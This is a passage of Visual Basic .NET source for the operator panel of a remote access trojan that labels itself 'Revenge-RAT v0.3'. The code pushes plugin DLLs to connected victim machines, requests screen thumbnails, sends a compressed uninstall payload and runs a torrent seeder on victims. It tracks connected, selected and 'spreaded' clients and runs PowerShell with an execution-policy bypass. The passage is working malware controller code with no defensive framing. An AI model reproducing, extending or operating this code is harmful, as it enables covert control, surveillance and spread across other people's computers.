                    Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                    current.Tag = "Pause"
                    Me.s.Send(Conversions.ToInteger(current.ToolTipText), String.Concat(New String() {"IE", Me.Key, SocketServer.md5(File.ReadAllBytes((Application.StartupPath & "\Plugin\SM.dll"))), Me.Key, current.ToolTipText, Me.Key, Conversions.ToString(True), Me.Key, "SM", Me.Key, "SM"}))
                Loop
            Finally
            End Try
        End If
    End Sub

    Private Sub TabPage10_Enter(sender As Object, e As EventArgs) Handles TabPage10.Enter
        Me.Load_Builder_Settings("Default")
    End Sub

    Private Sub TASKBARFN_DoubleClick(sender As Object, e As EventArgs) Handles TASKBARFN.DoubleClick
        Me.TASKBARFN.Text = Me.RandomVariable(5, 12)
    End Sub
    Public Sub TD(ByVal S As Integer)
        Try
            Dim enumerator As IEnumerator
            Try
                enumerator = Me.Listview1.Items.GetEnumerator
                Do While enumerator.MoveNext
                    Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                    If (Conversions.ToDouble(current.ToolTipText) = S) Then
                        current.Tag = "0"
                    End If
                Loop
            Finally
            End Try
        Catch exception1 As Exception
        End Try
    End Sub

    Private Sub TestPowershell_Click(sender As Object, e As EventArgs) Handles TestPowershell.Click
        If (Me.PSCommands.Text = Nothing) Then
            MessageBox.Show("You must add powershell commands!!", "Revenge-RAT v0.3", MessageBoxButtons.OK, MessageBoxIcon.Asterisk)
        Else
            Interaction.Shell(("powershell -ExecutionPolicy Bypass -Command " & Me.PSCommands.Text), AppWinStyle.MinimizedFocus, False, -1)
        End If
    End Sub

    Private Sub TH_DoubleClick(sender As Object, e As EventArgs) Handles TH.DoubleClick
        Try
            If ((Me.TH.SelectedItems.Count > 0) AndAlso Me.TH.SelectedItems.Item(0).Tag.ToString.Contains("Location")) Then
                MessageBox.Show(Conversions.ToString(Me.TH.SelectedItems.Item(0).Tag), "Client Information", MessageBoxButtons.OK, MessageBoxIcon.Asterisk)
            End If
        Catch exception1 As Exception
            ProjectData.SetProjectError(exception1)
            ProjectData.ClearProjectError()
        End Try
    End Sub

    Private Sub THS_Click(sender As Object, e As EventArgs) Handles THS.Click
        If Operators.ConditionalCompareObjectEqual(Me.THS.Tag, "Down", False) Then
            Me.THS.Tag = "Up"
            Me.THS.Image = My.Resources.expand_less_white_24x24
            Dim size3 As New Size(Me.TableLayoutPanel50.Size.Width, &H20)
            Me.TableLayoutPanel50.Size = size3
        Else
            Me.THS.Tag = "Down"
            Me.THS.Image = My.Resources.expand_more_white_24x24
            Dim size2 As New Size(Me.TableLayoutPanel50.Size.Width, 200)
            Me.TableLayoutPanel50.Size = size2
        End If
    End Sub

    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        If ((Me.TH.Items.Count = 0) AndAlso (Me.Startc.Text = "Stop")) Then
            Me.Startc.PerformClick()
        End If
        Me.ToolStripStatusLabel19.Text = "You have ( 0 ) custom plugin".Replace("0", Conversions.ToString(Me.Plugin.Items.Count))
        If (Me.Plugin.Items.Count > 0) Then
            Me.ToolStripSeparator6.Visible = True
        Else
            Me.ToolStripSeparator6.Visible = False
        End If
        If Me.ToolStripStatusLabel17.Visible Then
            Me.ToolStripStatusLabel17.Visible = False
        Else
            Me.ToolStripStatusLabel17.Visible = True
            Me.ToolStripStatusLabel17.Text = "Total Blocked ( 0 )".Replace("0", Conversions.ToString(Me.BlockedIp.Items.Count))
        End If
        Me.ToolStripStatusLabel20.Text = Me.GTN
        Me.ToolStripStatusLabel9.Text = "Connected Clients : ( *C* ) | Selected Clients : ( *S* ) | Spreaded Clients ( *SP* )".Replace("*C*", Conversions.ToString(Me.Listview1.Items.Count)).Replace("*S*", Conversions.ToString(Me.Listview1.SelectedItems.Count)).Replace("*SP*", Conversions.ToString(Me.GS))
        If (Not My.Application.OpenForms.Item("TSF") Is Nothing) Then
            Dim seeder As Torrent_Seeder = DirectCast(My.Application.OpenForms.Item("TSF"), Torrent_Seeder)
            seeder.Text = ("Torrent Seeder | @" & Environment.MachineName & " | Total Clients : ( 0 )".Replace("0", Conversions.ToString(seeder.Clients.Items.Count)))
        End If
    End Sub

    Private Sub Timer4_Tick(sender As Object, e As EventArgs) Handles Timer4.Tick
        Try
            If (Me.TH.Items.Count > 0) Then
                Dim enumerator As IEnumerator
                Try
                    enumerator = Me.Listview1.Items.GetEnumerator
                    Do While enumerator.MoveNext
                        Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                        If (current.SubItems.Item(15).Text = "....") Then
                            If File.Exists((Application.StartupPath & "\Plugin\SP.dll")) Then
                                Me.s.Send(Conversions.ToInteger(current.ToolTipText), String.Concat(New String() {"IE", Me.Key, SocketServer.md5(File.ReadAllBytes((Application.StartupPath & "\Plugin\SP.dll"))), Me.Key, current.ToolTipText, Me.Key, Conversions.ToString(True), Me.Key, "SP", Me.Key, "SP"}))
                            End If
                        Else
                            Dim num As Integer = Conversions.ToInteger(SocketServer.GetIndex(Me.TQ.SelectedIndex))
                            Me.s.Send(Conversions.ToInteger(current.SubItems.Item(15).Text), String.Concat(New String() {"GP2", Me.Key, Conversions.ToString(num), Me.Key, Conversions.ToString(Me.ThumbnailWidth.Value), Me.Key, Conversions.ToString(Me.ThumbnailHeight.Value)}))
                        End If
                    Loop
                Finally
                End Try
            End If
        Catch exception1 As Exception
        End Try
    End Sub

    Private Sub ToolStripMenuItem2_Click(sender As Object, e As EventArgs) Handles ToolStripMenuItem2.Click
        Dim enumerator As IEnumerator
        Try
            enumerator = Me.Hostsfilelist.SelectedItems.GetEnumerator
            Do While enumerator.MoveNext
                DirectCast(enumerator.Current, ListViewItem).Remove()
            Loop
        Finally
        End Try
    End Sub

    Private Sub ToolStripMenuItem3_Click(sender As Object, e As EventArgs) Handles ToolStripMenuItem3.Click
        Dim enumerator As IEnumerator
        Try
            enumerator = Me.Hostsfilelist.Items.GetEnumerator
            Do While enumerator.MoveNext
                DirectCast(enumerator.Current, ListViewItem).Remove()
            Loop
        Finally
        End Try
    End Sub

    Private Sub TorrentSeederToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles TorrentSeederToolStripMenuItem.Click
        If (Not My.Application.OpenForms.Item("TSF") Is Nothing) Then
            If (Me.Listview1.SelectedItems.Count > 0) Then
                Dim enumerator As IEnumerator
                Try
                    enumerator = Me.Listview1.SelectedItems.GetEnumerator
                    Do While enumerator.MoveNext
                        Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                        current.Tag = "Pause"
                        Me.s.Send(Conversions.ToInteger(current.ToolTipText), String.Concat(New String() {"IE", Me.Key, SocketServer.md5(File.ReadAllBytes((Application.StartupPath & "\Plugin\TS.dll"))), Me.Key, current.ToolTipText, Me.Key, Conversions.ToString(True), Me.Key, "TS", Me.Key, "TS"}))
                    Loop
                Finally
                End Try
            End If
        ElseIf (Me.Listview1.SelectedItems.Count > 0) Then
            My.Forms.Select_Torrent.ShowDialog()
        End If
    End Sub

    Private Sub TreeView1_KeyPress(sender As Object, e As KeyPressEventArgs) Handles TreeView1.KeyPress
        Try
            If (e.KeyChar = ChrW(13)) Then
                Me.GTP()
            End If
        Catch exception1 As Exception
        End Try
    End Sub

    Private Sub TreeView1_NodeMouseDoubleClick(sender As Object, e As TreeNodeMouseClickEventArgs) Handles TreeView1.NodeMouseDoubleClick
        Try
            Me.GTP()
        Catch exception1 As Exception
        End Try
    End Sub

    Private Sub UninstallToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles UninstallToolStripMenuItem.Click
        If (MessageBox.Show("This action will definitely Uninstall the selected users, Are You Sure ?", "Uninstall User(s)", MessageBoxButtons.YesNo, MessageBoxIcon.Question) = DialogResult.Yes) Then
            Dim enumerator As IEnumerator
            Try
                enumerator = Me.Listview1.SelectedItems.GetEnumerator
                Do While enumerator.MoveNext
                    Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                    Me.s.Send(Conversions.ToInteger(current.ToolTipText), String.Concat(New String() {"UNV", Me.Key, Convert.ToBase64String(SocketServer.Compress(My.Resources.UNI)), Me.Key, "UNI.UNI", Me.Key, Me.RandomVariable(5, 8), Me.Key, "False", Me.Key, "False", Me.Key, "False", Me.Key, Me.RandomVariable(1, 5), Me.Key, Me.RandomVariable(1, 5), Me.Key, "False", Me.Key, "False", Me.Key, SocketServer.GenRandom(1, 10), ".tmp", Me.RandomVariable(1, 5), Me.Key, Me.RandomVariable(1, 5), Me.Key, "False"}))
                Loop
            Finally
            End Try
        End If
    End Sub

    Private Sub URLCK_CheckedChanged(sender As Object, e As EventArgs) Handles URLCK.CheckedChanged
        Me.URLTX.Enabled = Me.URLCK.Checked
        If (Me.URLCK.Text = Nothing) Then
            Me.URLCK.Text = "Client"
        End If
    End Sub

    Private Sub VBSCK_CheckedChanged(sender As Object, e As EventArgs) Handles VBSCK.CheckedChanged
        Me.VBSTX.Enabled = Me.VBSCK.Checked
        If (Me.VBSTX.Text = Nothing) Then
            Me.VBSTX.Text = "Client"
        End If
    End Sub

    Private Sub ViewPluginDetailsToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ViewPluginDetailsToolStripMenuItem.Click
        Dim enumerator As IEnumerator
        Try
            enumerator = Me.Plugin.SelectedItems.GetEnumerator
            Do While enumerator.MoveNext
                Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                Dim pa As New PA
                Dim versionInfo As FileVersionInfo = FileVersionInfo.GetVersionInfo(current.ToolTipText)
                Dim stream As New MemoryStream
                Icon.ExtractAssociatedIcon(current.ToolTipText).ToBitmap.Save(stream, ImageFormat.Png)
                pa.PAR.Text = versionInfo.CompanyName
                pa.PN.Text = versionInfo.LegalTrademarks
                pa.WB.Text = versionInfo.LegalCopyright
                pa.PD.Text = versionInfo.FileDescription
                pa.PictureBox1.Image = New Bitmap(Image.FromStream(New MemoryStream(stream.ToArray)))
                pa.Icon = Icon.FromHandle(New Bitmap(pa.PictureBox1.Image).GetHicon)
                pa.Text = pa.PN.Text
                pa.Show()
            Loop
        Finally
        End Try
    End Sub
    Public Function x(ByVal H As Integer) As Object
        Dim obj2 As Object
        If (H = 0) Then
            Me.PictureBox2.Image = My.Resources._Default
            Return obj2
        End If
        If (H = 1) Then
            Me.PictureBox2.Image = My.Resources.THE_MYSTERIES_LEGACY
            Return obj2
        End If
        If (H = 2) Then
            Me.PictureBox2.Image = My.Resources.v_B01___3hud
            Return obj2
        End If
        If (H = 3) Then
            Me.PictureBox2.Image = My.Resources.Tsunamii
            Return obj2
        End If
        If (H = 4) Then
            Me.PictureBox2.Image = My.Resources.Dark_Slate_Blue
            Return obj2
        End If
        If (H = 5) Then
            Me.PictureBox2.Image = My.Resources.Spring_Green
            Return obj2
        End If
        If (H = 6) Then
            Me.PictureBox2.Image = My.Resources.Steel_Blue
            Return obj2
        End If
        If (H = 7) Then
            Me.PictureBox2.Image = My.Resources.Teal
            Return obj2
        End If
        If (H = 8) Then
            Me.PictureBox2.Image = My.Resources.Night_Fury
            Return obj2
        End If
        If (H = 9) Then
            Me.PictureBox2.Image = My.Resources.Light_Sea_Green
            Return obj2
        End If
        If (H = 10) Then
            Me.PictureBox2.Image = My.Resources.Gray
            Return obj2
        End If
        If (H = 11) Then
            Me.PictureBox2.Image = My.Resources.Ebony
            Return obj2
        End If
        If (H = 12) Then
            Me.PictureBox2.Image = My.Resources.Darkness
            Return obj2
        End If
        If (H = 13) Then
            Me.PictureBox2.Image = My.Resources.Corduroy
            Return obj2
        End If
        If (H = 14) Then
            Me.PictureBox2.Image = My.Resources.Gondola
            Return obj2
        End If
        If (H = 15) Then
            Me.PictureBox2.Image = My.Resources.Black_Currant
        End If
        Return obj2
    End Function

    Private Sub InjectSettings_Click(sender As Object, e As EventArgs) Handles InjectSettings.Click
        If Operators.ConditionalCompareObjectEqual(Me.InjectSettings.Tag, "Down", False) Then
            Me.InjectSettings.Tag = "Up"
            Me.InjectSettings.Image = My.Resources.expand_less_white_24x24
            Dim size3 As New Size(Me.TableLayoutPanel45.Size.Width, &H20)
            Me.TableLayoutPanel45.Size = size3
        Else
            Me.InjectSettings.Tag = "Down"
            Me.InjectSettings.Image = My.Resources.expand_more_white_24x24
            Dim size2 As New Size(Me.TableLayoutPanel45.Size.Width, &H91)
            Me.TableLayoutPanel45.Size = size2
        End If
    End Sub

    Public Overridable Property s As SocketServer
        <DebuggerNonUserCode>
        Get
            Return Me._s
        End Get
        <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode>
        Set(ByVal WithEventsValue As SocketServer)
            Dim handler As DisConnectedEventHandler = New DisConnectedEventHandler(AddressOf Me.disconnected)
            Dim handler2 As ConnectedEventHandler = New ConnectedEventHandler(AddressOf Me.Connect)
            Dim handler3 As DataEventHandler = New DataEventHandler(AddressOf Me.data)
            If (Not Me._s Is Nothing) Then
                RemoveHandler Me._s.DisConnected, handler
                RemoveHandler Me._s.Connected, handler2
                RemoveHandler Me._s.Data, handler3
            End If
            Me._s = WithEventsValue
            If (Not Me._s Is Nothing) Then
                AddHandler Me._s.DisConnected, handler
                AddHandler Me._s.Connected, handler2
                AddHandler Me._s.Data, handler3
            End If
        End Set
    End Property

    Public Class clsListviewSorter
        Implements IComparer
        ' Methods
        Public Sub New(ByVal column_number As Integer, ByVal sort_order As SortOrder)
            Me.m_ColumnNumber = column_number
            Me.m_SortOrder = sort_order
        End Sub

        Public Function [Compare](ByVal x As Object, ByVal y As Object) As Integer Implements IComparer.Compare
            Dim text As String
            Dim str2 As String
            Dim item As ListViewItem = DirectCast(x, ListViewItem)
            Dim item2 As ListViewItem = DirectCast(y, ListViewItem)
            If (item.SubItems.Count <= Me.m_ColumnNumber) Then
                [text] = ""
            Else
                [text] = item.SubItems.Item(Me.m_ColumnNumber).Text
            End If
            If (item2.SubItems.Count <= Me.m_ColumnNumber) Then
                str2 = ""
            Else
                str2 = item2.SubItems.Item(Me.m_ColumnNumber).Text
            End If
            If (Me.m_SortOrder = SortOrder.Ascending) Then
                If (Versioned.IsNumeric([text]) And Versioned.IsNumeric(str2)) Then
                    Return Conversion.Val([text]).CompareTo(Conversion.Val(str2))
                End If
                If (Information.IsDate([text]) And Information.IsDate(str2)) Then
                    Return DateTime.Parse([text]).CompareTo(DateTime.Parse(str2))
                End If
                Return String.Compare([text], str2)
            End If
            If (Versioned.IsNumeric([text]) And Versioned.IsNumeric(str2)) Then
                Return Conversion.Val(str2).CompareTo(Conversion.Val([text]))
            End If
            If (Information.IsDate([text]) And Information.IsDate(str2)) Then
                Return DateTime.Parse(str2).CompareTo(DateTime.Parse([text]))
            End If
            Return String.Compare(str2, [text])
        End Function


        ' Fields
        Private m_ColumnNumber As Integer
        Private m_SortOrder As SortOrder
    End Class

    Private Sub ToolStripMenuItem6_Click(sender As Object, e As EventArgs) Handles ToolStripMenuItem6.Click
        Dim enumerator As IEnumerator
        Try
            enumerator = Me.Hostsfilelist.SelectedItems.GetEnumerator
            Do While enumerator.MoveNext
                DirectCast(enumerator.Current, ListViewItem).Remove()
            Loop
        Finally
        End Try
    End Sub

    Private Sub ToolStripMenuItem7_Click(sender As Object, e As EventArgs) Handles ToolStripMenuItem7.Click
        Dim enumerator As IEnumerator
        Try
            enumerator = Me.Hostsfilelist.Items.GetEnumerator
            Do While enumerator.MoveNext
                DirectCast(enumerator.Current, ListViewItem).Remove()
            Loop
        Finally
        End Try
    End Sub
End Class